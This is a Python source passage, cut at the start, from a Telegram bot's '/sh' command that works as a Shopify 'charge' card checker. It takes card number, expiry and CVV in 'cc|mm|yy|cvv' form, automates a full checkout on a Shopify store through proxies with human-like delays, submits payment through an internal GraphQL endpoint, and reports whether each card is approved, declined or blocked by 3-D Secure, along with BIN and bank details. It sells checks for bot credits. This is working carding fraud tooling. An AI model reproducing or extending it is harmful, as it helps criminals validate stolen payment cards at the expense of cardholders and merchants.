            if not payment_session_id:
                return False, "No payment session ID in response"
            
            # Now submit payment via GraphQL
            payment_url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
            
            payment_headers = self.get_graphql_headers()
            payment_headers['x-checkout-web-build-id'] = self.x_checkout_web_build_id
            payment_headers['x-checkout-web-deploy-stage'] = 'production'
            
            payment_payload = {
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "sessionInput": {
                            "locale": "en-US",
                            "countryCode": "US"
                        },
                        "paymentSession": {
                            "id": payment_session_id,
                            "resourceType": "PAYMENT_SESSION"
                        }
                    },
                    "attemptToken": f"{self.checkout_token}-{self.generate_attempt_token()}",
                    "metafields": []
                },
                "id": "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
            }
            
            response = await self.make_request(
                client, 'POST', payment_url,
                json=payment_payload,
                headers=payment_headers
            )
            
            if response.status_code == 200:
                result = response.json()
                
                # Check for errors in response
                if 'errors' in result:
                    errors = result['errors']
                    error_msg = errors[0].get('message', 'Unknown error') if errors else 'Unknown error'
                    error_type = self.detect_error_type(error_msg)
                    return False, f"{error_type}: {self.clean_error_message(error_msg)}"
                
                # Check for data
                if 'data' in result:
                    data = result['data']
                    if 'submitForCompletion' in data:
                        completion_data = data['submitForCompletion']
                        if 'payment' in completion_data:
                            payment_data = completion_data['payment']
                            if payment_data.get('state') == 'SUCCESS':
                                logger.success("Payment successful")
                                return True, "Payment successful"
                            else:
                                error_msg = payment_data.get('errorMessage', 'Payment failed')
                                error_type = self.detect_error_type(error_msg)
                                return False, f"{error_type}: {self.clean_error_message(error_msg)}"
                
                return False, "Payment submission failed - no valid response"
                    
            elif response.status_code == 422:
                # Shopify validation error
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', 'Validation error')
                    error_type = self.detect_error_type(error_msg)
                    return False, f"{error_type}: {self.clean_error_message(error_msg)}"
                except:
                    return False, "VALIDATION_ERROR: Payment validation failed"
                    
            else:
                return False, f"SERVER_ERROR: Status {response.status_code}"
                
        except Exception as e:
            error_type = self.detect_error_type(str(e))
            return False, f"{error_type}: {str(e)[:100]}"

    def generate_shopify_signature(self):
        """Generate a Shopify signature (simplified version)"""
        import hashlib
        import hmac
        import base64
        
        # Create a simple signature for demo purposes
        # In production, this would need to match Shopify's actual signature generation
        timestamp = str(int(time.time()))
        message = f"2{timestamp}60757803170"
        
        # Use a simple hash for now
        return f"eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.{base64.b64encode(message.encode()).decode()}.dummy_signature"

    def generate_attempt_token(self):
        """Generate attempt token"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(20))

    async def complete_checkout(self, client):
        """Complete the checkout"""
        try:
            logger.step(8, 8, "Completing checkout...")
            
            if not self.checkout_token:
                return False, "No checkout token"
            
            # In Shopify's new flow, payment submission completes the checkout
            # We just need to verify the checkout is complete
            verify_url = f"{self.base_url}/checkouts/{self.checkout_token}.json"
            
            verify_headers = self.get_shopify_headers(
                referer=f"{self.base_url}/checkouts/{self.checkout_token}"
            )
            
            response = await self.make_request(
                client, 'GET', verify_url,
                headers=verify_headers
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('checkout', {}).get('completed_at'):
                    logger.success("Checkout completed")
                    return True, "Checkout completed successfully"
                else:
                    return False, f"Checkout not completed: {result.get('status', 'unknown')}"
            else:
                return False, f"Complete check failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Complete error: {str(e)}"

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response message"""
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        # Clean error message
        if ":" in message:
            error_parts = message.split(":", 1)
            if len(error_parts) > 1:
                error_type = error_parts[0].strip()
                error_msg = error_parts[1].strip()
                message_display = f"{error_type}: {error_msg}"
            else:
                message_display = message
        else:
            message_display = message

        if status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
        elif "CARD_DECLINED" in message or "DECLINED" in message.upper():
            status_emoji = "❌"
            status_text = "DECLINED"
        elif "3D_SECURE" in message or "AUTHENTICATION" in message.upper():
            status_emoji = "🛡️"
            status_text = "3D SECURE"
        elif "CAPTCHA" in message:
            status_emoji = "🤖"
            status_text = "CAPTCHA"
        elif "FRAUD" in message:
            status_emoji = "🚫"
            status_text = "FRAUD"
        elif "INSUFFICIENT" in message:
            status_emoji = "💰"
            status_text = "INSUFFICIENT FUNDS"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /sh」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Shopify Charge
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()
        logger.info(f"🔍 Starting Shopify Charge check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Get BIN info
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Create HTTP client with proxy if available
            client_params = {
                'timeout': 30.0,
                'follow_redirects': False,  # We'll handle redirects manually
                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
                'http2': True,
                'cookies': self.cookies
            }
            
            if self.current_proxy:
                client_params['proxy'] = {
                    'http://': self.current_proxy,
                    'https://': self.current_proxy
                }
                logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Browse store
                success, error = await self.browse_store(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Store access failed: {error}", username, time.time()-start_time, user_data, bin_info)

                await self.human_delay(1, 2)

                # Step 2: View product
                success, error = await self.view_product(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Product view failed: {error}", username, time.time()-start_time, user_data, bin_info)

                await self.human_delay(1, 2)

                # Step 3: Add to cart
                success, error = await self.add_to_cart(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Add to cart failed: {error}", username, time.time()-start_time, user_data, bin_info)

                await self.human_delay(1, 2)

                # Step 4: Go to checkout
                success, error = await self.go_to_checkout(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Checkout failed: {error}", username, time.time()-start_time, user_data, bin_info)

                await self.human_delay(1, 2)

                # Step 5: Get checkout data
                success, data_or_error = await self.get_checkout_data(client)
                if not success:
                    logger.warning(f"Checkout data warning: {data_or_error}")

                await self.human_delay(1, 2)

                # Step 6: Fill shipping info
                success, user_info_or_error = await self.fill_shipping_info(client)
                if not success:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Shipping failed: {user_info_or_error}", username, time.time()-start_time, user_data, bin_info)

                user_info = user_info_or_error
                await self.human_delay(1, 2)

                # Step 7: Submit payment
                success, payment_result = await self.submit_payment(client, (cc, mes, ano, cvv), user_info)
                
                elapsed_time = time.time() - start_time
                
                if success:
                    logger.success(f"Payment successful in {elapsed_time:.2f}s")
                    # Step 8: Complete checkout
                    complete_success, complete_result = await self.complete_checkout(client)
                    if complete_success:
                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successfully Charged", username, elapsed_time, user_data, bin_info)
                    else:
                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", f"Charged but checkout incomplete: {complete_result}", username, elapsed_time, user_data, bin_info)
                else:
                    logger.error(f"Payment failed: {payment_result}")
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", payment_result, username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "TIMEOUT_ERROR: Request timeout", username, elapsed_time, user_data, bin_info)
        except httpx.ConnectError:
            logger.error("Connection error")
            elapsed_time = time.time() - start_time
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "CONNECTION_ERROR: Connection failed", username, elapsed_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            elapsed_time = time.time() - start_time
            error_type = self.detect_error_type(str(e))
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"{error_type}: {str(e)[:80]}", username, elapsed_time, user_data, bin_info)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "sh", 
                    "Shopify Charge",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[SHOPIFY CHARGE]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
⟐ <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>
<b>~ Store:</b> <code>meta-app-prod-store-1.myshopify.com</code>
<b>~ Product:</b> <code>retailer-id-fix-no-mapping</code>
<b>~ Address:</b> <code>8 Log Pond Drive, Horsham PA 19044</code>
<b>~ Shipping:</b> <code>Local Pickup</code>
<b>~ Tip:</b> <code>None</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Shopify Charge", "sh"
            ) if charge_processor else f"""<b>「$cmd → /sh」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Shopify Charge
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
<b>[+] Store:</b> meta-app-prod-store-1.myshopify.com
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional
                checker.check_card,         # positional
                card_details,               # check_args[0]
                username,                   # check_args[1]
                user_data,                  # check_args[2]
                credits_needed=2,           # keyword
                command_name="sh",          # keyword
                gateway_name="Shopify Charge"  # keyword
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
